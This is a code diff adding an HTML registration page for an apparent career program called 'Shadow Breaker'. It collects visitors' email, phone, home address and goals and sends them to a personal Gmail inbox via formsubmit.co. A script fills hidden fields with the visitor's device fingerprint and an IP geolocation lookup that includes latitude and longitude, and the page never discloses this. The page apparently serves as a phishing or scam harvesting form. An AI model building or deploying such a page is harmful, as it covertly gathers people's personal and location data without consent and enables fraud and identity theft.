@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Shadow Breaker Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { background: #0a0a0a; color: #f0f0f0; font-family: Arial, sans-serif; padding: 20px; }
+    label, input, textarea, select, button {
+      display: block; width: 100%; margin-bottom: 15px; padding: 10px;
+      background: #1a1a1a; color: #fff; border: 1px solid #333; border-radius: 5px;
+    }
+    button {
+      background: #222; cursor: pointer;
+    }
+    button:hover {
+      background: #444;
+    }
+    #fullscreen-loader {
+      display: none; position: fixed; inset: 0; background: #000;
+      opacity: 0.9; z-index: 9999; color: #fff;
+      font-size: 2rem; justify-content: center; align-items: center;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Shadow Breaker Registration</h2>
+
+<form id="finalForm" action="https://formsubmit.co/kingstonmick7@gmail.com" method="POST" novalidate autocomplete="on">
+
+  <!-- Honeypot -->
+  <div style="display:none;">
+    <label>Leave this field empty</label>
+    <input type="text" name="_honey">
+  </div>
+
+  <!-- Email -->
+  <label for="email">Email</label>
+  <input type="email" name="personal_email" id="email" required
+         placeholder="you@example.com"
+         oninvalid="this.setCustomValidity('Enter a valid email address')"
+         oninput="setCustomValidity('')">
+
+  <!-- Phone -->
+  <label for="phone">Phone Number</label>
+  <input type="tel" name="phone" id="phone"
+         pattern="^\+?[0-9\s\-]{7,15}$"
+         required placeholder="+123456789"
+         oninvalid="this.setCustomValidity('Enter a valid phone number')"
+         oninput="setCustomValidity('')">
+
+  <!-- Country -->
+  <label for="country">Country</label>
+  <select name="country" id="country" required
+          oninvalid="this.setCustomValidity('Please select your country')"
+          oninput="setCustomValidity('')">
+    <option value="">Select your country</option>
+    <option>United States</option>
+    <option>United Kingdom</option>
+    <option>Canada</option>
+    <option>India</option>
+    <option>Germany</option>
+    <option>France</option>
+    <option>Australia</option>
+    <option>Japan</option>
+    <option>Brazil</option>
+    <option>Others</option>
+  </select>
+
+  <!-- City -->
+  <label for="city">City</label>
+  <input type="text" name="city" id="city" required
+         placeholder="e.g., Berlin"
+         oninvalid="this.setCustomValidity('Please enter your city')"
+         oninput="setCustomValidity('')">
+
+  <!-- Address -->
+  <label for="address">Address</label>
+  <input type="text" name="address" id="address" required
+         placeholder="Full address"
+         oninvalid="this.setCustomValidity('Please enter your address')"
+         oninput="setCustomValidity('')">
+
+  <!-- Postal Code -->
+  <label for="postal">Postal Code</label>
+  <input type="text" name="postal" id="postal" required
+         pattern="^[a-zA-Z0-9\s\-]{3,10}$"
+         placeholder="ZIP or Postal"
+         oninvalid="this.setCustomValidity('Enter a valid postal code')"
+         oninput="setCustomValidity('')">
+
+  <!-- Program Path -->
+  <label for="path">Preferred Path</label>
+  <select name="path" id="path" required
+          oninvalid="this.setCustomValidity('Select your path')"
+          oninput="setCustomValidity('')">
+    <option value="">Choose one</option>
+    <option>Technology</option>
+    <option>Healthcare</option>
+    <option>Logistics</option>
+    <option>Business Services</option>
+  </select>
+
+  <!-- Career Goals -->
+  <label for="goal">Career Goals</label>
+  <textarea name="goal" id="goal" rows="4" required
+            placeholder="Your career vision"
+            oninvalid="this.setCustomValidity('Tell us your career goal')"
+            oninput="setCustomValidity('')"></textarea>
+
+  <!-- Hidden Metadata Fields -->
+  <input type="hidden" name="userAgent" id="userAgent">
+  <input type="hidden" name="platform" id="platform">
+  <input type="hidden" name="language" id="language">
+  <input type="hidden" name="timezone" id="timezone">
+  <input type="hidden" name="geo_ip" id="geo_ip">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="box">
+  <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
+
+  <button type="submit" id="submitFinal">Submit</button>
+</form>
+
+<!-- Loader -->
+<div id="fullscreen-loader">Sending...</div>
+
+<!-- Fingerprint + Geo + Loader JS -->
+<script>
+  window.addEventListener('DOMContentLoaded', () => {
+    // Device info
+    document.getElementById('userAgent').value = navigator.userAgent;
+    document.getElementById('platform').value = navigator.platform;
+    document.getElementById('language').value = navigator.language;
+    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    // Geolocation fallback via API
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const loc = `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country_name}, Lat/Lng: ${data.latitude},${data.longitude}`;
+        document.getElementById('geo_ip').value = loc;
+      })
+      .catch(() => {
+        document.getElementById('geo_ip').value = 'Geo location unavailable';
+      });
+  });
+
+  // Loader
+  document.getElementById('submitFinal').addEventListener('click', () => {
+    document.getElementById('fullscreen-loader').style.display = 'flex';
+  });
+</script>
+
+</body>
+</html>
